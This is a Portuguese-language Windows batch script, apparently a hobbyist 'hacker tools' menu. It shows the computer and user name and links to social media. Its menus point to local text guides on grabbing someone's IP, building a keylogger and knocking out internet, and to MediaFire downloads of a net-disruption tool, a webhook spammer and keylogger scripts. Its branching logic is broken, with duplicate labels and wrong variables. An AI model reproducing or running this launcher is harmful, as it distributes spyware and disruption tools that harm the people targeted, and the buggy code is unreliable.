@echo off
Set /a num=(%Random% %%9)+1
color %num%
set /p root=User: 

:menu
cls
Set /a num=(%Random% %%9)+1
color %num%
date /t

echo.
echo Computador: %computername% * %username%  Usuario: %root%
echo.

echo.
echo            BY SAS
echo  =====================================
echo  * 1. Mudar Cor                      *
echo  * 2. Downloads                      *
echo  * 3. +Opcoes                        *
echo  * 4. Redes Sociais                  *
echo  * 5. Sair                           *
echo  =====================================
echo.


set /p fds= Escolha Sua Opcao: 
echo ----------------------------
if %fds% equ 1 goto op1
if %fds% equ 2 goto op2
if %fds% equ 3 goto op3
if %fds% equ 4 goto op4
if %fds% equ 5 goto op5

:op1
goto menu

pause
goto menu

:op2
goto menu4:
cls

goto menu

:op3
cls

goto menu

:op4
goto menu3

:op5
echo.
echo  voce tem certeza que quer Sair
echo.

set /p j=S/N: 
if %fds% equ S exit
if %fds% equ N goto menu

:menu2
cls
Set /a num=(%Random% %%9)+1
color %num%
date /t

echo.
echo Computador: %computername% * %username%  Usuario: %root%
echo.

echo.
echo            BY SAS
echo  =====================================
echo  * 1. Youtube                        *
echo  * 2. Discord                        *
echo  * 3. Voltar                         *
echo  =====================================
echo.

set /p fd= Escolha Sua Opcao: 
echo ----------------------------
if %fds% equ 1 goto o1
if %fds% equ 2 goto o2
if %fds% equ 3 goto o3

:o1
start https://www.youtube.com/channel/UCQ34EYxMMD-2aBD2Q-ErVKw
goto menu2

:o2
start https://discord.gg/67Cq8j29jE
goto menu2

:o3
cls & goto menu


:menu3
cls
Set /a num=(%Random% %%9)+1
color %num%
date /t

echo.
echo Computador: %computername% * %username%  Usuario: %root%
echo.

echo.
echo            BY SAS
echo  =====================================
echo  * 1. Como ter um terminal           *
echo  * 2. Como pegar ip de alguem        *
echo  * 3. Como fazer um keylogger        *
echo  * 4. Como derrubar internet         *
echo  * 5. Voltar                         *
echo  =====================================
echo.


set /p fds= Escolha Sua Opcao: 
echo ----------------------------
if %fds% equ 1 goto t1
if %fds% equ 2 goto t2
if %fds% equ 3 goto t3
if %fds% equ 4 goto t4
if %fds% equ 5 goto t5

:t1
cd bin & start term.txt
goto menu3

:t2
cd bin & start ip.txt
goto menu3

:t3
cd bin & start key.txt
goto menu3

:t4
cd bin & start inter.txt
goto menu3

:t5
goto menu

:menu4
cls
Set /a num=(%Random% %%9)+1
color %num%
date /t

echo.
echo Computador: %computername% * %username%  Usuario: %root%
echo.

echo.
echo            BY SAS
echo  =====================================
echo  * 1. Derrubar Net                   *
echo  * 2. Webhook Spammer                *
echo  * 3. Pack de icones                 *
echo  * 4. Pack de arquivo bat            *
echo  * 5. Keylogger.bat                  *
echo  * 6. Keyboard.py                    *
echo  * 7. Clonador                       *
echo  * 8. Ajudante pessoal em bat        *
echo  * 9. Ajudante pessoal em exe        *
echo  * 10. Voltar                        *
echo  =====================================
echo.


set /p fds= Escolha Sua Opcao: 
echo ----------------------------
if %fds% equ 1 goto t1
if %fds% equ 2 goto t2
if %fds% equ 3 goto t3
if %fds% equ 4 goto t4
if %fds% equ 5 goto t5
if %fds% equ 1 goto t6
if %fds% equ 2 goto t7
if %fds% equ 3 goto t8
if %fds% equ 4 goto t9
if %fds% equ 5 goto t10

:t1
start https://download1476.mediafire.com/nvazw3gxf4mg/mu1kae8tdvtekfz/Derrubar+Net.rar
goto menu4

:t2
start https://download1584.mediafire.com/vaoy18ft1jng/ssgvemc46e4rwsp/Webhook+Spammer.py
goto menu4

:t3
start https://download947.mediafire.com/b372f8vrrqxg/v81ccxsou9y7jvc/%23+icones+DO+windows+7+by+TIPOTUFF.rar
start https://download1472.mediafire.com/fev582zyhqsg/nf205f37ggspeex/ICONES.rar
goto menu4

:t4
start https://download1079.mediafire.com/i6pyy8i9zrug/xtyop12wxukqxog/pack+arquivo+bat.rar
goto menu4

:t5
start https://download947.mediafire.com/o7cm8rsfq99g/njgyxxxemdtovrq/keylogger.bat
goto menu4

:t6
start https://download1648.mediafire.com/c8gs40lwaxsg/d9rrgqaa24z7ymg/keyboard.py
goto menu4

:t7
start https://download1074.mediafire.com/senkgwo60e6g/v5r57xf45eud7iz/Clonador.rar
goto menu4

:t8
start https://download936.mediafire.com/wobts7i6hrzg/l2do26bgd1aca8f/ajudante+pessoal.rar
goto menu4

:t9
start https://download1349.mediafire.com/cemvh0h9tkog/xbv6jj7k481l0dj/Ajudante+Pessoal2.rar
goto menu4

:t10
goto menu
